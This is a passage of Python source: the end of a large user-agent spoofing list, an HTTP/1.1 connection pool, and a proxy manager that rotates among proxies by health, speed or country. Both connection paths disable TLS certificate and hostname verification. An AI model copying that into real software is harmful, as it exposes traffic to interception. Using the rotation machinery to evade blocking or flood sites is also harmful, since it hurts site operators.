			"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
			"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
			"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
			"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
			"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
			"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
			"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
			"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
			"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
			"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
			"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
			"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
			"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
			"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
			"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
			"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
			"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
			"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
			"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
			"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
			"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
			"MSIE (MSIE 6.0; X11; Linux; i686) Opera 7.23",
			"msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
			"msnbot/1.0 ( http://search.msn.com/msnbot.htm)",
			"msnbot/1.1 ( http://search.msn.com/msnbot.htm)",
			"msnbot-media/1.1 ( http://search.msn.com/msnbot.htm)",
			"NetSurf/1.2 (NetBSD; amd64)",
			"Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0",
			"Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0",
			"Nokia6230/2.0 (04.44) Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia6230i/2.0 (03.80) Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0",
			"NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
			"NokiaN73-1/3.0649.0.0.1 Series60/3.0 Profile/MIDP2.0 Configuration/CLDC-1.1",
			"nook browser/1.0",
			"Offline Explorer/2.5",
			"Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
			"Opera/7.50 (Windows ME; U) [en]",
			"Opera/7.50 (Windows XP; U)",
			"Opera/7.51 (Windows NT 5.1; U) [en]",
			"Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr)",
			"Opera/9.0 (Macintosh; PPC Mac OS X; U; en)",
			"Opera/9.20 (Macintosh; Intel Mac OS X; U; en)",
			"Opera/9.25 (Windows NT 6.0; U; en)",
			"Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)",
			"Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)",
			"Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Opera/9.60 (J2ME/MIDP; Opera Mini/4.1.11320/608; U; en) Presto/2.2.0",
			"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14320/554; U; cs) Presto/2.2.0",
			"Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1",
			"Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0",
			"Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
			"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
			"Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61",
			"Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
			"Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
			"Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
			"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
			"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
			"Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
			"Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
			"P3P Validator",
			"Peach/1.01 (Ubuntu 8.04 LTS; U; en)",
			"POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
			"POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
			"portalmmm/2.0 N410i(c20;TB) ",
			"Python-urllib/2.5",
			"SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
			"SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
			"SearchExpress",
			"SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
			"SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
			"SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
			"SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonT100/R101",
			"SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
			"SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonT68/R201A",
			"SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
			"SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
			"SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SuperBot/4.4.0.60 (Windows XP)",
			"Uzbl (Webkit 1.3) (Linux i686 [i686])",
			"Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1",
			"W3C_Validator/1.305.2.12 libwww-perl/5.64",
			"W3C_Validator/1.654",
			"w3m/0.5.1",
			"WDG_Validator/1.6.2",
			"WebCopier v4.6",
			"Web Downloader/6.9",
			"WebZIP/3.5 (http://www.spidersoft.com)",
			"Wget/1.9.1",
			"Wget/1.9 cvs-stable (Red Hat modified)",
			"wii libnup/1.0",
			]

# Enhanced HTTP/1.1 Connection Management
from collections import defaultdict
import queue
import weakref

class HTTP1ConnectionPool:
    """HTTP/1.1 connection pool for efficient connection reuse"""

    def __init__(self, max_connections_per_host=10, max_idle_time=30):
        self.pools = defaultdict(queue.Queue)
        self.max_connections_per_host = max_connections_per_host
        self.max_idle_time = max_idle_time
        self.connection_counts = defaultdict(int)
        self.lock = threading.RLock()
        self.last_cleanup = time.time()

    def get_connection(self, host, port, use_ssl=False, proxy=None):
        """Get a connection from the pool or create a new one"""
        pool_key = self._get_pool_key(host, port, use_ssl, proxy)

        with self.lock:
            # Try to get an existing connection
            pool = self.pools[pool_key]

            while not pool.empty():
                try:
                    conn_info = pool.get_nowait()
                    sock, created_time = conn_info

                    # Check if connection is still valid
                    if time.time() - created_time < self.max_idle_time and self._is_socket_alive(sock):
                        return sock
                    else:
                        # Connection expired or dead, close it
                        try:
                            sock.close()
                        except:
                            pass
                        self.connection_counts[pool_key] -= 1

                except queue.Empty:
                    break

            # Create new connection if under limit
            if self.connection_counts[pool_key] < self.max_connections_per_host:
                sock = self._create_connection(host, port, use_ssl, proxy)
                if sock:
                    self.connection_counts[pool_key] += 1
                    return sock

            return None

    def return_connection(self, sock, host, port, use_ssl=False, proxy=None):
        """Return a connection to the pool"""
        if not sock or not self._is_socket_alive(sock):
            return

        pool_key = self._get_pool_key(host, port, use_ssl, proxy)

        with self.lock:
            pool = self.pools[pool_key]
            if pool.qsize() < self.max_connections_per_host:
                pool.put((sock, time.time()))
            else:
                # Pool is full, close the connection
                try:
                    sock.close()
                except:
                    pass
                self.connection_counts[pool_key] -= 1

    def _get_pool_key(self, host, port, use_ssl, proxy):
        """Generate a unique key for the connection pool"""
        proxy_key = f"{proxy[0]}:{proxy[1]}" if proxy else "direct"
        return f"{host}:{port}:{use_ssl}:{proxy_key}"

    def _is_socket_alive(self, sock):
        """Check if socket is still alive"""
        try:
            # Use MSG_PEEK to check without consuming data
            sock.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT)
            return True
        except (socket.error, OSError):
            return False

    def _create_connection(self, host, port, use_ssl, proxy):
        """Create a new connection"""
        try:
            if proxy:
                # Create connection through proxy
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((proxy[0], int(proxy[1])))

                if use_ssl:
                    # For HTTPS through HTTP proxy, use CONNECT method
                    connect_request = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
                    sock.send(connect_request.encode())

                    # Read CONNECT response
                    response = sock.recv(1024).decode()
                    if "200" not in response:
                        sock.close()
                        return None

                    # Wrap with SSL
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)

                return sock
            else:
                # Direct connection
                timeout_config = load_timeout_config()
                sock = socket.create_connection((host, port), timeout=timeout_config.connection_timeout)

                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)

                return sock

        except Exception as e:
            http2_logger.error(f"Failed to create connection to {host}:{port}: {e}")
            return None

    def cleanup_expired(self):
        """Clean up expired connections"""
        current_time = time.time()
        if current_time - self.last_cleanup < 60:  # Cleanup every minute
            return

        with self.lock:
            for pool_key, pool in list(self.pools.items()):
                new_pool = queue.Queue()

                while not pool.empty():
                    try:
                        conn_info = pool.get_nowait()
                        sock, created_time = conn_info

                        if current_time - created_time < self.max_idle_time and self._is_socket_alive(sock):
                            new_pool.put(conn_info)
                        else:
                            try:
                                sock.close()
                            except:
                                pass
                            self.connection_counts[pool_key] -= 1

                    except queue.Empty:
                        break

                self.pools[pool_key] = new_pool

            self.last_cleanup = current_time

# Global connection pool instance
http1_pool = HTTP1ConnectionPool()

# Advanced Proxy Management System
import json
import geoip2.database
import geoip2.errors
from collections import deque
from datetime import datetime, timedelta

@dataclass
class ProxyInfo:
    """Enhanced proxy information"""
    host: str
    port: int
    proxy_type: str  # 'http', 'socks4', 'socks5'
    username: Optional[str] = None
    password: Optional[str] = None
    country: Optional[str] = None
    city: Optional[str] = None
    success_count: int = 0
    failure_count: int = 0
    total_response_time: float = 0.0
    last_used: Optional[datetime] = None
    last_check: Optional[datetime] = None
    is_working: bool = True
    consecutive_failures: int = 0
    max_consecutive_failures: int = 5
    priority: int = 1  # 1-10, higher is better

    @property
    def success_rate(self) -> float:
        """Calculate success rate"""
        total = self.success_count + self.failure_count
        return self.success_count / total if total > 0 else 1.0

    @property
    def average_response_time(self) -> float:
        """Calculate average response time"""
        return self.total_response_time / self.success_count if self.success_count > 0 else 0.0

    @property
    def health_score(self) -> float:
        """Calculate overall health score (0-1)"""
        success_weight = 0.6
        speed_weight = 0.3
        recency_weight = 0.1

        # Success rate component
        success_component = self.success_rate * success_weight

        # Speed component (inverse of response time, normalized)
        avg_time = self.average_response_time
        speed_component = (1.0 / (1.0 + avg_time)) * speed_weight if avg_time > 0 else speed_weight

        # Recency component
        if self.last_used:
            hours_since_use = (datetime.now() - self.last_used).total_seconds() / 3600
            recency_component = max(0, 1.0 - (hours_since_use / 24)) * recency_weight
        else:
            recency_component = 0

        return success_component + speed_component + recency_component

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization"""
        return {
            'host': self.host,
            'port': self.port,
            'proxy_type': self.proxy_type,
            'username': self.username,
            'password': self.password,
            'country': self.country,
            'city': self.city,
            'success_count': self.success_count,
            'failure_count': self.failure_count,
            'total_response_time': self.total_response_time,
            'last_used': self.last_used.isoformat() if self.last_used else None,
            'last_check': self.last_check.isoformat() if self.last_check else None,
            'is_working': self.is_working,
            'consecutive_failures': self.consecutive_failures,
            'priority': self.priority,
            'success_rate': self.success_rate,
            'average_response_time': self.average_response_time,
            'health_score': self.health_score
        }

class ProxyRotationStrategy(Enum):
    """Proxy rotation strategies"""
    ROUND_ROBIN = "round_robin"
    WEIGHTED_RANDOM = "weighted_random"
    HEALTH_BASED = "health_based"
    GEOGRAPHIC = "geographic"
    LEAST_USED = "least_used"
    FASTEST = "fastest"

class AdvancedProxyManager:
    """Advanced proxy management with intelligent rotation and monitoring"""

    def __init__(self, geoip_db_path: Optional[str] = None):
        self.proxies: Dict[str, ProxyInfo] = {}
        self.proxy_chains: List[List[str]] = []  # For proxy chaining
        self.rotation_strategy = ProxyRotationStrategy.HEALTH_BASED
        self.lock = threading.RLock()
        self.round_robin_index = 0
        self.geoip_reader = None
        self.performance_history = deque(maxlen=1000)  # Keep last 1000 performance records

        # Initialize GeoIP database if available
        if geoip_db_path:
            try:
                self.geoip_reader = geoip2.database.Reader(geoip_db_path)
            except Exception as e:
                http2_logger.warning(f"Failed to load GeoIP database: {e}")

    def add_proxy(self, host: str, port: int, proxy_type: str = "http",
                  username: Optional[str] = None, password: Optional[str] = None,
                  priority: int = 1) -> str:
        """Add a proxy to the manager"""
        proxy_id = f"{host}:{port}"

        with self.lock:
            # Get geographic information if available
            country, city = self._get_geo_info(host)

            proxy_info = ProxyInfo(
                host=host,
                port=port,
                proxy_type=proxy_type,
                username=username,
                password=password,
                country=country,
                city=city,
                priority=priority
            )

            self.proxies[proxy_id] = proxy_info
            http2_logger.info(f"Added proxy: {proxy_id} ({country}, {city})")

        return proxy_id

    def _get_geo_info(self, host: str) -> Tuple[Optional[str], Optional[str]]:
        """Get geographic information for a host"""
        if not self.geoip_reader:
            return None, None

        try:
            response = self.geoip_reader.city(host)
            country = response.country.name
            city = response.city.name
            return country, city
        except (geoip2.errors.AddressNotFoundError, Exception):
            return None, None

    def load_proxies_from_file(self, filename: str, proxy_type: str = "http") -> int:
        """Load proxies from file"""
        loaded_count = 0

        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue

                    # Parse different formats
                    if '@' in line:
                        # Format: username:password@host:port
                        auth_part, host_part = line.split('@')
                        username, password = auth_part.split(':')
                        host, port = host_part.split(':')
                    else:
                        # Format: host:port
                        username, password = None, None
                        host, port = line.split(':')

                    self.add_proxy(host, int(port), proxy_type, username, password)
                    loaded_count += 1

        except Exception as e:
            http2_logger.error(f"Failed to load proxies from {filename}: {e}")

        http2_logger.info(f"Loaded {loaded_count} proxies from {filename}")
        return loaded_count

    def get_proxy(self, target_country: Optional[str] = None) -> Optional[ProxyInfo]:
        """Get next proxy based on rotation strategy"""
        with self.lock:
            if not self.proxies:
                return None

            working_proxies = [p for p in self.proxies.values() if p.is_working]
            if not working_proxies:
                # If no working proxies, try to use any proxy
                working_proxies = list(self.proxies.values())

            if not working_proxies:
                return None

            # Filter by country if specified
            if target_country:
                country_proxies = [p for p in working_proxies if p.country == target_country]
                if country_proxies:
                    working_proxies = country_proxies

            # Apply rotation strategy
            if self.rotation_strategy == ProxyRotationStrategy.ROUND_ROBIN:
                proxy = self._get_round_robin_proxy(working_proxies)
            elif self.rotation_strategy == ProxyRotationStrategy.WEIGHTED_RANDOM:
                proxy = self._get_weighted_random_proxy(working_proxies)
            elif self.rotation_strategy == ProxyRotationStrategy.HEALTH_BASED:
                proxy = self._get_health_based_proxy(working_proxies)
            elif self.rotation_strategy == ProxyRotationStrategy.LEAST_USED:
                proxy = self._get_least_used_proxy(working_proxies)
            elif self.rotation_strategy == ProxyRotationStrategy.FASTEST:
                proxy = self._get_fastest_proxy(working_proxies)
            else:
                proxy = random.choice(working_proxies)

            if proxy:
                proxy.last_used = datetime.now()

            return proxy

    def _get_round_robin_proxy(self, proxies: List[ProxyInfo]) -> ProxyInfo:
        """Round-robin proxy selection"""
        proxy = proxies[self.round_robin_index % len(proxies)]
        self.round_robin_index += 1
        return proxy

    def _get_weighted_random_proxy(self, proxies: List[ProxyInfo]) -> ProxyInfo:
        """Weighted random proxy selection based on priority and health"""
        weights = [p.priority * p.health_score for p in proxies]
        total_weight = sum(weights)

        if total_weight == 0:
            return random.choice(proxies)

        r = random.uniform(0, total_weight)
        cumulative = 0

        for i, weight in enumerate(weights):
            cumulative += weight
            if r <= cumulative:
                return proxies[i]

        return proxies[-1]

    def _get_health_based_proxy(self, proxies: List[ProxyInfo]) -> ProxyInfo:
        """Health-based proxy selection"""
        # Sort by health score (descending)
        sorted_proxies = sorted(proxies, key=lambda p: p.health_score, reverse=True)

        # Select from top 25% with some randomness
        top_count = max(1, len(sorted_proxies) // 4)
        return random.choice(sorted_proxies[:top_count])

    def _get_least_used_proxy(self, proxies: List[ProxyInfo]) -> ProxyInfo:
        """Least recently used proxy selection"""
        return min(proxies, key=lambda p: p.last_used or datetime.min)

    def _get_fastest_proxy(self, proxies: List[ProxyInfo]) -> ProxyInfo:
        """Fastest proxy selection based on average response time"""
        # Filter proxies with response time data
        timed_proxies = [p for p in proxies if p.success_count > 0]
        if not timed_proxies:
            return random.choice(proxies)

        return min(timed_proxies, key=lambda p: p.average_response_time)

    def update_proxy_stats(self, proxy_id: str, success: bool, response_time: float = 0.0):
        """Update proxy statistics"""
        with self.lock:
            if proxy_id not in self.proxies:
                return

            proxy = self.proxies[proxy_id]
            proxy.last_check = datetime.now()

            if success:
                proxy.success_count += 1
                proxy.total_response_time += response_time
                proxy.consecutive_failures = 0
                proxy.is_working = True
            else:
                proxy.failure_count += 1
                proxy.consecutive_failures += 1

                # Mark as not working if too many consecutive failures
                if proxy.consecutive_failures >= proxy.max_consecutive_failures:
                    proxy.is_working = False

            # Record performance history
            self.performance_history.append({
                'proxy_id': proxy_id,
                'timestamp': datetime.now(),
                'success': success,
                'response_time': response_time
            })

    def get_proxy_stats(self) -> Dict[str, Any]:
        """Get comprehensive proxy statistics"""
        with self.lock:
            total_proxies = len(self.proxies)
